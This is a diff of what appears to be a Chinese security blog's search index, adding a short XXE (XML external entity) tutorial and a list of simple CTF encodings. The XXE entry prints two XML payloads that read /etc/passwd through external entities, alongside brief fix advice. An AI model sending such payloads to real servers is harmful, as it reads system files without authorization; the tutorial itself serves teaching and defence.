@@ -4,6 +4,56 @@
   
   
   <entry>
+    <title>XXE-外部实体注入</title>
+    <link href="/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
+    <url>/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>当应用程序解析XML文档时，如果未正确限制或禁用外部实体的使用，攻击者可以通过构造恶意XML文档，加载外部文件或代码，从而实现攻击。</p><p>代码如下：</p><p><img src="/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/image-20261006100819893.png" alt="image-20261006100819893"></p><p>启动环境之后首页显示phpinfo，查看libxml</p><p><img src="/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/image-20261006100922119.png" alt="image-20261006100922119"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/image-20261006101319500.png" alt="image-20261006101319500"></p><p>payload:</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [ <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span> %xxe; ]&gt;</span></code></pre></div><p>或者</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE r [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT r <span class="hljs-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">sp</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">r</span>&gt;</span><span class="hljs-symbol">&amp;sp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">r</span>&gt;</span></code></pre></div><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>过滤用户提交的数据如 &lt; &gt; [ ] 等符号</p><p>不允许XML中含有自己定义的DTD</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>XXE</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>CTF-CRYPTO[密码学]</title>
+    <link href="/CTF-CRYPTO-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    <url>/CTF-CRYPTO-%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
+    
+    <content type="html"><![CDATA[<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><blockquote><p>由于某些编码过于简单，且可以通过《随波逐流》等工具软件一键解码，将此类密码记录在省略部分，在此不多赘述。</p></blockquote><h1 id="省略部分"><a href="#省略部分" class="headerlink" title="省略部分"></a>省略部分</h1><ul><li>base 家族<ul><li>base64</li><li>base32</li><li>base16</li><li>….</li></ul></li><li>URL 编码</li><li>凯撒密码</li><li>猪圈密码</li><li>栅栏密码</li><li>盲文</li><li>摩斯密码</li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>密码学</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ClickJacking点击劫持漏洞</title>
     <link href="/ClickJacking%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/"/>
     <url>/ClickJacking%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/</url>
@@ -448,9 +498,9 @@
       
       <tag>代码审计</tag>
       
-      <tag>php</tag>
-      
       <tag>反序列化</tag>
+      
+      <tag>php</tag>
       
     </tags>
     
